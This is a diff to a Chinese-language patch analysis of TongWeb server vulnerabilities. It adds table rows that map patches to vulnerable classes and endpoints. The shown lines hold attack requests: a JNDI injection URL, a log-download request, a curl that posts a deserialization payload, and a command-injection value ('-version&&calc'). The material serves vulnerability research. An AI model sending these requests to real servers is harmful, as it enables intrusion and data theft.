@@ -128,9 +128,14 @@ Servlet配置，重点在于名为springmvc的servlet
 |补丁1-文件上传|com.tongweb.admin.jmx.remote.server.servlet.AppUploadServlet|`/sysweb/upload`|
 |补丁2-文件上传|com.tongweb.console.deployer.controller.Upload|`/console/Upload`|
 |补丁2-命令执行|com.tongweb.admin.jmx.remote.server.servlet.RemoteJmxConnectorServlet|`/sysweb/rjcs`|
-|补丁3-|——|——|
+|补丁3-文件上传/下载|com.tongweb.agent.com.FileTransferUtil#sendFile/receiveFile|——|
 |补丁4-JNDI|com.tongweb.console.jca.controller.JCAController|`/console/rest/jca/nameCheck`|
-|补丁5-Log任意下载|——|`/console/rest/log/downloadLog`|
+|补丁4-命令执行|com.tongweb.server.ExternalOptions|服务器参数中加入`-version&&calc`|
+|补丁5-Log任意下载|com.tongweb.console.log.controller.LogShowController|`/console/rest/log/downloadLog`|
+|补丁5-管理控制台未授权访问|com.tongweb.console.security.controller.UserController#create/update|`/console/rest/security/users/create`|
+|补丁5-命令执行|org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter|`/console/service`|
+|补丁5-任意文件删除|com.tongweb.console.monitor.controller.SnapshotController|`/console/rest/monitor/snapshots/delete`|
+|补丁5-EJB远程调用反序列化|com.tongweb.tongejb.server.httpd.ServerServlet|`/console/ejb/`|
 
 
 
@@ -423,7 +428,7 @@ com.tongweb.console.monitor.controller.SnapshotController#uploadResult
 http://ip:9060/console/rest/jca/nameCheck?name=rmi://ip:1099/jzr8wb
 ```
 漏洞点位于`com.tongweb.console.jca.controller.JCAController#checkJNDIName`
-```
+```java
     @GET
     @Path("nameCheck")
     @Produces({"application/xml", "application/json"})
@@ -460,7 +465,7 @@ POST http://ip:9060/console/rest/log/downloadLog?names=server.log
 ```
 
 对应的类
-```
+```java
 # LogShowController
 
 @POST
@@ -530,13 +535,13 @@ public void downloadLog(String[] logFileNames, HttpServletResponse response) thr
   </pre>
 </details>
 
-**（2）修复管理控制台未授权访问漏洞**
+**（2）管理控制台未授权访问漏洞**
 
 TongWeb6控制台创建用户、修改用户和设置权限_补丁004
 
 补丁在`com.tongweb.console.security.controller.UserController#create/update`的方法中都加入了如下的权限判断
 	
-```
+```java
 HttpSession session = this.request.getSession();
 GenericPrincipal genericPrincipal = (GenericPrincipal)((StandardSession)((StandardSessionFacade)session).session).getPrincipal();
 if (genericPrincipal == null) {
@@ -608,7 +613,7 @@ HttpInvokerServiceExporter处理请求的方法如下
     }
 ```
 readRemoteInvocation核心代码如下，进行了反序列化操作
-```
+```java
 ObjectInputStream ois = this.createObjectInputStream(this.decorateInputStream(request, is));
 RemoteInvocation var4 = this.doReadRemoteInvocation(ois); // doReadRemoteInvocation核心代码-> Object obj = ois.readObject();
 ```
@@ -617,7 +622,7 @@ RemoteInvocation var4 = this.doReadRemoteInvocation(ois); // doReadRemoteInvocat
 curl -X POST "http://ip:9060/console/service" --data-binary @test2.txt -H "Content-type: application/octet-stream"
 ```
 
-**（5）修复任意文件删除漏洞**
+**（5）任意文件删除漏洞**
 位于补丁_007，`applications/console/WEB-INF/classes/com/tongweb/console/commons/ConsoleFilter.class`,原本`ConsoleFilter.doFilter()`只是一行简单的链式调用
 ```
 chain.doFilter(request, response);
